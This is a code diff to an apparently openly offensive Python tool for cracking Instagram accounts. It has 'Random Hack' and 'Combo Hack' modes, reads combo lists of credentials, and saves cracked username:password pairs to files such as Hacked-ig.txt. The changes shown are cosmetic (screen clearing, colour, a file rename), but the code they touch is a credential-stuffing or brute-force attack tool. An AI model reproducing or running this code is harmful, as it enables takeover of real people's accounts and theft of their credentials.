@@ -1,4 +1,6 @@
 import os
+os.system('color 0A')
+os.system('cls||clear')
 try:
 	import requests,random,threading
 	from time import sleep
@@ -22,7 +24,7 @@ def SeveHck(user,pess):
 	with open('Hacked-ig.txt', 'a') as J:
 		J.write(user+':'+pess+'\n')
 def SeveScour(user,pess):
-	with open('secure-ig.txt', 'a') as J:
+	with open('Secure-ig.txt', 'a') as J:
 		J.write(user+':'+pess+'\n')
 def SeveBand(user,pess):
 	with open('Band-ig.txt', 'a') as J:
@@ -49,6 +51,7 @@ def User_Agent():
 class randoomPas:
 	def __init__(self):
 		global modeRnd
+		os.system('cls||clear')
 		print('===============Random Hack===============')
 		self.mod = modeRnd
 		self.user=''
@@ -124,6 +127,7 @@ class randoomPas:
 			except KeyboardInterrupt:Exit()
 class ComboHck:
 	def __init__(self):
+		os.system('cls||clear')
 		print('===============Combo Hack===============')
 		self.c = input('[$] Enter name file combo : ')
 		try:self.file = open(self.c, 'r')
